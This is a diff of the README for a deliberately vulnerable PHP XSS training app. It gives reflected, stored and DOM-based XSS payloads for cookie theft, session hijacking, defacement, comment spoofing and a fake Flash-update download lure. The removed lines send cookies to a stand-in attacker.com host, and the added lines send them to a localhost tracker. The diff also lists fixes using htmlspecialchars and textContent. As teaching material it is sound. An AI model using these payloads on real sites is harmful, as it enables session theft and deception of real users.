@@ -10,55 +10,89 @@ This repository contains a PHP application intentionally designed with security 
 - **Admin**: `admin` / `admin123`
 - **User**: `victim` / `password123`
 
-## Vulnerability Overview
+## Attacker Dashboard
 
-The application is susceptible to Cross-Site Scripting (XSS) in several forms:
-- **Reflected XSS**: In `search.php` (via `query` parameter) and `profile.php` (via `msg` parameter).
-- **Stored XSS**: In `product.php` (via the customer review/comments section).
-- **DOM-based XSS**: In `product.php` (via `promo` parameter in the URL).
+To view the stolen data, navigate to the attacker's dashboard:
+[http://localhost:8000/attacker/](http://localhost:8000/attacker/)
+
+### Understanding the Logs
+The "Data Type" column categorizes the stolen information:
+- **c**: A base64-encoded browser **c**ookie.
+- **sid**: A raw **s**ession **ID** string.
+
+---
 
 ## Attack Scenarios and Payloads
 
 ### 1. Data Theft
-**Objective**: Steal session cookies.
+**Objective**: Steal and decode a user's session cookie.
 - **Where to inject**: Product review in `product.php`.
 - **Payload**:
   ```html
-  <script>fetch('http://attacker.com/log?c=' + btoa(document.cookie));</script>
+  <script>fetch('http://localhost:8000/attacker/tracker.php?c=' + btoa(document.cookie));</script>
   ```
 
 ### 2. Session Hijacking
 **Objective**: Steal a session ID to impersonate a user.
-- **Where to inject**: Search query in `search.php` or a product review.
+- **Where to inject**: Search query in `search.php`.
 - **Payload**:
   ```html
-  <script>new Image().src="http://attacker.com/steal?sid=" + document.cookie;</script>
+  <script>new Image().src="http://localhost:8000/attacker/tracker.php?sid=" + document.cookie;</script>
   ```
 
 ### 3. Defacement
-**Objective**: Change the website's appearance.
+**Objective**: Visually alter the website.
 - **Where to inject**: Product review in `product.php`.
 - **Payload**:
   ```html
-  <script>document.body.innerHTML = '<h1>HACKED</h1>';</script>
+  <script>document.body.innerHTML = '<h1 style="color:red;font-size:5rem;text-align:center;">SITE DEFACED</h1>';</script>
   ```
 
 ### 4. Reputation Damage
-**Objective**: Make a user appear to say something they didn't.
+**Objective**: Modify a user's comment to something they didn't write.
 - **Where to inject**: Product review in `product.php`.
 - **Payload**:
   ```html
-  <script>document.querySelector('.card-text').innerText = 'I hate this store!';</script>
+  <script>document.querySelector('.comment-text').innerText = 'This is a terrible product!';</script>
   ```
 
 ### 5. Malware Distribution
-**Objective**: Force a file download.
+**Objective**: Trick a user into downloading a fake software update.
 - **Where to inject**: URL parameter `promo` in `product.php`.
-- **Example URL**: `http://localhost:8000/product.php?id=1&promo=<iframe src="http://attacker.com/malware.exe"></iframe>`
 - **Payload**:
   ```html
-  <iframe src="http://attacker.com/malware.exe"></iframe>
+  <div style="text-align:center; border:2px solid red; padding:20px;">
+    <h3>Flash Player Update Required</h3>
+    <p>Please install the latest version to view this content.</p>
+    <a href="data:application/octet-stream;base64,SGVsbG8sIFdvcmxkIQ==" download="flash_update.exe" style="display:inline-block; background:red; color:white; padding:10px 20px; text-decoration:none; border-radius:5px;">Download Now</a>
+  </div>
   ```
+
+---
+
+## Vulnerability Fixes
+
+Each vulnerability can be fixed by replacing the vulnerable code with a secure alternative. The fixes are included as comments in the source files.
+
+- **Reflected XSS (`search.php`)**
+  - **File**: `search.php`
+  - **Vulnerable Code**: `echo $query;`
+  - **Fix**: `echo htmlspecialchars($query, ENT_QUOTES, 'UTF-8');`
+
+- **Reflected XSS (`profile.php`)**
+  - **File**: `profile.php`
+  - **Vulnerable Code**: `echo $msg;`
+  - **Fix**: `echo htmlspecialchars($msg, ENT_QUOTES, 'UTF-8');`
+
+- **Stored XSS (`product.php`)**
+  - **File**: `product.php`
+  - **Vulnerable Code**: `echo $c['comment'];`
+  - **Fix**: `echo htmlspecialchars($c['comment'], ENT_QUOTES, 'UTF-8');`
+
+- **DOM-based XSS (`product.php`)**
+  - **File**: `product.php`
+  - **Vulnerable Code**: `document.getElementById('promo-banner').innerHTML = ...;`
+  - **Fix**: `document.getElementById('promo-banner').textContent = ...;`
 
 ---
 **Disclaimer**: This application is intentionally vulnerable and should only be used in a controlled, isolated lab environment for educational purposes.
